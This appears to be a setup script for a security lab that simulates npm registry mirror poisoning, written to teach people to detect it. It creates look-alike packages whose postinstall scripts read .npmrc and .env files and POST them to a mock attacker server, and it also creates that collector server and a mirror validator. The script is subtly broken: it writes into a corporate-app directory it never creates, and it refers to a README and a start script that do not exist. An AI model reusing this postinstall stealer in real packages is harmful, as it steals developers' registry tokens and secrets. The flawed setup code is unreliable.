#!/bin/bash

# Scenario 11: Registry Mirror Poisoning Attack - Setup Script

set -e

echo "================================================"
echo "🔧 Setting up Registry Mirror Poisoning Scenario"
echo "================================================"
echo ""

# Check if TESTBENCH_MODE is enabled
if [ "$TESTBENCH_MODE" != "enabled" ]; then
    echo "⚠️  WARNING: TESTBENCH_MODE is not enabled"
    echo "Please run: export TESTBENCH_MODE=enabled"
    echo ""
    read -p "Do you want to continue anyway? (y/N): " -n 1 -r
    echo ""
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 1
    fi
fi

# Check prerequisites
echo "📋 Checking prerequisites..."
command -v node >/dev/null 2>&1 || { echo "❌ Node.js not installed"; exit 1; }
command -v npm >/dev/null 2>&1 || { echo "❌ npm not installed"; exit 1; }

echo "✅ Node.js version: $(node --version)"
echo "✅ npm version: $(npm --version)"
echo ""

# Create directory structure
echo "📁 Creating directory structure..."
mkdir -p legitimate-packages/enterprise-utils
mkdir -p legitimate-packages/secure-lib
mkdir -p compromised-mirror/enterprise-utils
mkdir -p compromised-mirror/secure-lib
mkdir -p infrastructure
mkdir -p detection-tools
echo "✅ Directories created"
echo ""

# Create legitimate packages
echo "📦 Creating legitimate packages..."

# Legitimate enterprise-utils
cat > legitimate-packages/enterprise-utils/package.json << 'EOF'
{
  "name": "enterprise-utils",
  "version": "1.0.0",
  "description": "Enterprise utility functions [LEGITIMATE]",
  "main": "index.js",
  "author": "EnterpriseCorp",
  "license": "MIT"
}
EOF

cat > legitimate-packages/enterprise-utils/index.js << 'EOF'
/**
 * LEGITIMATE ENTERPRISE UTILS
 * Clean utility functions for enterprise applications
 */

class EnterpriseUtils {
  static formatData(data) {
    return JSON.stringify(data, null, 2);
  }

  static validateInput(input) {
    return typeof input === 'string' && input.length > 0;
  }

  static log(message) {
    console.log(`[EnterpriseUtils] ${message}`);
  }
}

module.exports = EnterpriseUtils;
EOF

# Legitimate secure-lib
cat > legitimate-packages/secure-lib/package.json << 'EOF'
{
  "name": "secure-lib",
  "version": "2.0.0",
  "description": "Secure library for enterprise applications [LEGITIMATE]",
  "main": "index.js",
  "author": "EnterpriseCorp",
  "license": "MIT"
}
EOF

cat > legitimate-packages/secure-lib/index.js << 'EOF'
/**
 * LEGITIMATE SECURE LIB
 * Secure functions for enterprise applications
 */

class SecureLib {
  static encrypt(data) {
    // Simulated encryption
    return Buffer.from(data).toString('base64');
  }

  static decrypt(encrypted) {
    // Simulated decryption
    return Buffer.from(encrypted, 'base64').toString();
  }
}

module.exports = SecureLib;
EOF

echo "✅ Legitimate packages created"
echo ""

# Create compromised mirror packages
echo "📦 Creating compromised mirror packages..."

# Compromised enterprise-utils
cat > compromised-mirror/enterprise-utils/package.json << 'EOF'
{
  "name": "enterprise-utils",
  "version": "1.0.0",
  "description": "Enterprise utility functions [COMPROMISED MIRROR]",
  "main": "index.js",
  "author": "EnterpriseCorp",
  "license": "MIT",
  "scripts": {
    "postinstall": "node postinstall.js"
  }
}
EOF

cat > compromised-mirror/enterprise-utils/index.js << 'EOF'
/**
 * COMPROMISED ENTERPRISE UTILS (from poisoned mirror)
 * Appears legitimate but contains malicious code
 */

class EnterpriseUtils {
  static formatData(data) {
    return JSON.stringify(data, null, 2);
  }

  static validateInput(input) {
    return typeof input === 'string' && input.length > 0;
  }

  static log(message) {
    console.log(`[EnterpriseUtils] ${message}`);
  }
}

module.exports = EnterpriseUtils;
EOF

cat > compromised-mirror/enterprise-utils/postinstall.js << 'EOF'
/**
 * MALICIOUS POSTINSTALL SCRIPT
 * Executes when package is installed from compromised mirror
 * 
 * SAFETY: Only works in TESTBENCH_MODE
 */

if (process.env.TESTBENCH_MODE === 'enabled') {
  const http = require('http');
  const fs = require('fs');
  const os = require('os');
  const path = require('path');

  // Collect system information
  const data = {
    timestamp: new Date().toISOString(),
    package: 'enterprise-utils',
    version: '1.0.0',
    attackType: 'registry-mirror-poisoning',
    source: 'compromised-mirror',
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: process.platform,
    nodeVersion: process.version,
    cwd: process.cwd(),
    env: {
      NODE_ENV: process.env.NODE_ENV,
      REGISTRY: process.env.npm_config_registry || 'default'
    },
    files: {}
  };

  // Try to read sensitive files
  const sensitiveFiles = [
    path.join(os.homedir(), '.npmrc'),
    path.join(process.cwd(), '.env'),
    path.join(process.cwd(), 'package.json')
  ];

  sensitiveFiles.forEach(filePath => {
    try {
      if (fs.existsSync(filePath)) {
        data.files[filePath] = fs.readFileSync(filePath, 'utf8');
      }
    } catch (e) {
      // Silently fail
    }
  });

  // Exfiltrate data
  const payload = JSON.stringify(data);
  const options = {
    hostname: 'localhost',
    port: 3000,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payload.length
    }
  };

  const req = http.request(options, () => {
    // Data sent
  });

  req.on('error', () => {
    // Silently fail
  });

  req.write(payload);
  req.end();
}
EOF

# Compromised secure-lib
cat > compromised-mirror/secure-lib/package.json << 'EOF'
{
  "name": "secure-lib",
  "version": "2.0.0",
  "description": "Secure library for enterprise applications [COMPROMISED MIRROR]",
  "main": "index.js",
  "author": "EnterpriseCorp",
  "license": "MIT",
  "scripts": {
    "postinstall": "node postinstall.js"
  }
}
EOF

cat > compromised-mirror/secure-lib/index.js << 'EOF'
/**
 * COMPROMISED SECURE LIB (from poisoned mirror)
 * Appears legitimate but contains malicious code
 */

class SecureLib {
  static encrypt(data) {
    // Simulated encryption
    return Buffer.from(data).toString('base64');
  }

  static decrypt(encrypted) {
    // Simulated decryption
    return Buffer.from(encrypted, 'base64').toString();
  }
}

module.exports = SecureLib;
EOF

cat > compromised-mirror/secure-lib/postinstall.js << 'EOF'
if (process.env.TESTBENCH_MODE === 'enabled') {
  const http = require('http');
  const data = JSON.stringify({
    timestamp: new Date().toISOString(),
    package: 'secure-lib',
    version: '2.0.0',
    attackType: 'registry-mirror-poisoning',
    source: 'compromised-mirror'
  });
  const req = http.request({
    hostname: 'localhost', port: 3000, path: '/collect', method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
  }, () => {});
  req.on('error', () => {});
  req.write(data);
  req.end();
}
EOF

cat > compromised-mirror/README.md << 'EOF'
# Compromised Mirror

⚠️ **WARNING**: This directory simulates a compromised registry mirror.

## Attack Scenario

The internal npm registry mirror has been compromised. When developers install packages, they receive malicious versions instead of legitimate ones.

## How It Works

1. Attacker compromises mirror server
2. Replaces legitimate packages with malicious versions
3. Mirror serves malicious packages to all developers
4. Developers install packages from mirror
5. Malicious postinstall scripts execute

## Detection

- Compare packages with upstream (npmjs.com)
- Verify package checksums
- Check for unexpected postinstall scripts
- Monitor mirror behavior

## Safety

- Only executes when TESTBENCH_MODE=enabled
- Only sends data to localhost
- Clearly marked as compromised
EOF

echo "✅ Compromised mirror packages created"
echo ""

# Create corporate application
echo "📱 Creating corporate application..."
cat > corporate-app/package.json << 'EOF'
{
  "name": "enterprisecorp-web-app",
  "version": "1.0.0",
  "description": "EnterpriseCorp Web Application",
  "main": "index.js",
  "dependencies": {
    "enterprise-utils": "file:../compromised-mirror/enterprise-utils",
    "secure-lib": "file:../compromised-mirror/secure-lib"
  }
}
EOF

cat > corporate-app/.npmrc << 'EOF'
# EnterpriseCorp Internal Registry Configuration
# This simulates using an internal mirror
registry=http://internal-mirror.enterprisecorp.local:4873
always-auth=false
EOF

cat > corporate-app/index.js << 'EOF'
/**
 * ENTERPRISECORP WEB APPLICATION
 * Internal corporate application using packages from mirror
 */

console.log('🏢 Starting EnterpriseCorp Web Application...\n');

// Import packages (expecting legitimate versions from mirror)
const EnterpriseUtils = require('enterprise-utils');
const SecureLib = require('secure-lib');

console.log('📦 Loaded dependencies from internal mirror:');
console.log('  - enterprise-utils');
console.log('  - secure-lib');
console.log('');

// Initialize application
async function startApplication() {
  try {
    console.log('🔧 Initializing enterprise utilities...');
    const formatted = EnterpriseUtils.formatData({ 
      app: 'EnterpriseCorp Web App',
      version: '1.0.0'
    });
    console.log('✅ Enterprise utilities initialized');
    console.log(`   Formatted data: ${formatted.substring(0, 50)}...`);
    
    console.log('');
    console.log('🔐 Initializing secure library...');
    const encrypted = SecureLib.encrypt('sensitive-data-12345');
    console.log('✅ Secure library initialized');
    console.log(`   Encrypted data: ${encrypted.substring(0, 30)}...`);
    
    console.log('');
    console.log('✅ Application started successfully!');
    console.log('🌍 Server running on http://localhost:8080');
    console.log('');
    
    console.log('='.repeat(60));
    console.log('⚠️  CHECK YOUR MOCK SERVER FOR EXFILTRATED DATA');
    console.log('='.repeat(60));
    console.log('');
    console.log('If mirror poisoning was successful, sensitive data');
    console.log('may have been sent to the attacker\'s server.');
    console.log('');
    console.log('Run: curl http://localhost:3000/captured-data');
    console.log('');
    
  } catch (error) {
    console.error('❌ Application failed to start:', error.message);
    process.exit(1);
  }
}

startApplication();

// ============================================================================
// LEARNING NOTES:
// ============================================================================
// This application uses packages from an internal registry mirror.
//
// If mirror poisoning is successful:
// 1. Mirror serves malicious packages instead of legitimate ones
// 2. Developers install packages from compromised mirror
// 3. Malicious postinstall scripts execute
// 4. Sensitive data (API keys, configs) are exfiltrated
// 5. Application still works (malicious packages provide functionality)
// 6. Developers won't notice anything wrong
//
// Real-world impact:
// - All internal developers affected
// - Complete compromise of internal systems
// - Credential theft
// - Backdoor installation
// - Supply chain compromise
// ============================================================================
EOF

echo "✅ Corporate application created"
echo ""

# Create mock server
echo "📝 Creating mock attacker server..."
cat > infrastructure/mock-server.js << 'EOF'
/**
 * Mock Attacker Server
 * Receives and logs exfiltrated data from mirror poisoning attacks
 */

const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3000;
const logFile = path.join(__dirname, 'captured-data.json');

// Initialize log file
if (!fs.existsSync(logFile)) {
  fs.writeFileSync(logFile, JSON.stringify({ captures: [] }, null, 2));
}

const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/collect') {
    let body = '';
    
    req.on('data', chunk => {
      body += chunk.toString();
    });
    
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        
        // Log to console
        console.log('\n🎯 CAPTURED DATA FROM MIRROR POISONING:');
        console.log(`Package: ${data.package}@${data.version}`);
        console.log(`Attack Type: ${data.attackType}`);
        console.log(`Source: ${data.source}`);
        console.log(`Hostname: ${data.hostname}`);
        console.log(`Username: ${data.username}`);
        console.log(JSON.stringify(data, null, 2));
        console.log('─'.repeat(50));
        
        // Save to file
        const captures = JSON.parse(fs.readFileSync(logFile, 'utf8'));
        captures.captures.push({
          timestamp: new Date().toISOString(),
          attackType: 'registry-mirror-poisoning',
          data: data
        });
        fs.writeFileSync(logFile, JSON.stringify(captures, null, 2));
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'success', message: 'Data received' }));
      } catch (e) {
        console.error('Error processing data:', e);
        res.writeHead(400);
        res.end('Bad Request');
      }
    });
  } else if (req.method === 'GET' && req.url === '/captured-data') {
    const captures = fs.readFileSync(logFile, 'utf8');
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(captures);
  } else if (req.method === 'DELETE' && req.url === '/captured-data') {
    fs.writeFileSync(logFile, JSON.stringify({ captures: [] }, null, 2));
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'success', message: 'Data cleared' }));
  } else {
    res.writeHead(404);
    res.end('Not Found');
  }
});

server.listen(PORT, () => {
  console.log('🎭 Mock Attacker Server Started');
  console.log('─'.repeat(50));
  console.log(`Listening on http://localhost:${PORT}`);
  console.log('');
  console.log('Endpoints:');
  console.log(`  POST   /collect        - Receive exfiltrated data`);
  console.log(`  GET    /captured-data  - View captured data`);
  console.log(`  DELETE /captured-data  - Clear captured data`);
  console.log('─'.repeat(50));
  console.log('Waiting for data from mirror poisoning attacks...\n');
});
EOF

chmod +x infrastructure/mock-server.js
echo '{"captures": []}' > infrastructure/captured-data.json
echo "✅ Mock server created"
echo ""

# Create detection tool
echo "🔍 Creating detection tools..."
cat > detection-tools/mirror-validator.js << 'EOF'
#!/usr/bin/env node

/**
 * Mirror Validator
 * Validates packages from mirror against upstream registry
 */

const fs = require('fs');
const path = require('path');

class MirrorValidator {
  constructor(mirrorPath, upstreamPath) {
    this.mirrorPath = mirrorPath;
    this.upstreamPath = upstreamPath;
    this.findings = [];
  }

  async validate() {
    console.log('🔍 Mirror Validator');
    console.log('='.repeat(60));
    console.log(`Validating mirror: ${this.mirrorPath}`);
    console.log(`Against upstream: ${this.upstreamPath}\n`);

    try {
      await this.comparePackages();
      this.generateReport();
      return this.findings.length === 0;
    } catch (error) {
      console.error('❌ Validation failed:', error.message);
      return false;
    }
  }

  async comparePackages() {
    const mirrorPackages = fs.readdirSync(this.mirrorPath);
    
    for (const pkg of mirrorPackages) {
      const mirrorPkgPath = path.join(this.mirrorPath, pkg);
      const upstreamPkgPath = path.join(this.upstreamPath, pkg);
      
      if (!fs.existsSync(upstreamPkgPath)) {
        this.findings.push({
          severity: 'WARNING',
          package: pkg,
          message: `Package ${pkg} exists in mirror but not in upstream`,
          recommendation: 'Verify package source'
        });
        continue;
      }

      // Compare package.json
      const mirrorPkgJson = JSON.parse(fs.readFileSync(path.join(mirrorPkgPath, 'package.json'), 'utf8'));
      const upstreamPkgJson = JSON.parse(fs.readFileSync(path.join(upstreamPkgPath, 'package.json'), 'utf8'));

      // Check for postinstall scripts (suspicious in mirrored packages)
      if (mirrorPkgJson.scripts && mirrorPkgJson.scripts.postinstall) {
        if (!upstreamPkgJson.scripts || !upstreamPkgJson.scripts.postinstall) {
          this.findings.push({
            severity: 'CRITICAL',
            package: pkg,
            message: `Package ${pkg} has postinstall script in mirror but not in upstream`,
            recommendation: 'CRITICAL: Mirror may be compromised!'
          });
        }
      }

      // Check version mismatch
      if (mirrorPkgJson.version !== upstreamPkgJson.version) {
        this.findings.push({
          severity: 'WARNING',
          package: pkg,
          message: `Version mismatch: mirror=${mirrorPkgJson.version}, upstream=${upstreamPkgJson.version}`,
          recommendation: 'Verify version is intentional'
        });
      }
    }
  }

  generateReport() {
    console.log('\n' + '='.repeat(60));
    console.log('📊 Validation Results');
    console.log('='.repeat(60));

    const critical = this.findings.filter(f => f.severity === 'CRITICAL').length;
    const warnings = this.findings.filter(f => f.severity === 'WARNING').length;

    console.log(`Total Findings: ${this.findings.length}`);
    console.log(`  🚨 Critical: ${critical}`);
    console.log(`  ⚠️  Warnings: ${warnings}`);
    console.log('='.repeat(60));

    if (this.findings.length === 0) {
      console.log('\n✅ Mirror validation passed!');
      return;
    }

    console.log('\n🔍 Findings:\n');
    
    this.findings.forEach(finding => {
      const icon = finding.severity === 'CRITICAL' ? '🚨' : '⚠️';
      console.log(`${icon} [${finding.severity}] ${finding.message}`);
      if (finding.recommendation) {
        console.log(`   Recommendation: ${finding.recommendation}`);
      }
      console.log('');
    });

    if (critical > 0) {
      console.log('\n🚨 CRITICAL issues found! Immediate action required.');
      process.exit(1);
    }
  }
}

// CLI Interface
if (require.main === module) {
  const mirrorPath = process.argv[2] || path.join(__dirname, '../compromised-mirror');
  const upstreamPath = process.argv[3] || path.join(__dirname, '../legitimate-packages');
  const validator = new MirrorValidator(mirrorPath, upstreamPath);
  validator.validate();
}

module.exports = MirrorValidator;
EOF

chmod +x detection-tools/mirror-validator.js
echo "✅ Detection tools created"
echo ""

echo "================================================"
echo "✅ Setup Complete!"
echo "================================================"
echo ""
echo "🎯 Next Steps:"
echo ""
echo "1. Start mock server:"
echo "   node infrastructure/mock-server.js &"
echo ""
echo "2. Compare legitimate vs compromised packages:"
echo "   diff -r legitimate-packages/ compromised-mirror/"
echo ""
echo "3. Install packages from compromised mirror:"
echo "   cd corporate-app"
echo "   npm install"
echo ""
echo "4. Run detection tools:"
echo "   node detection-tools/mirror-validator.js"
echo ""
echo "5. Run corporate app:"
echo "   export TESTBENCH_MODE=enabled"
echo "   npm start"
echo ""
echo "📖 Read README.md for full instructions"
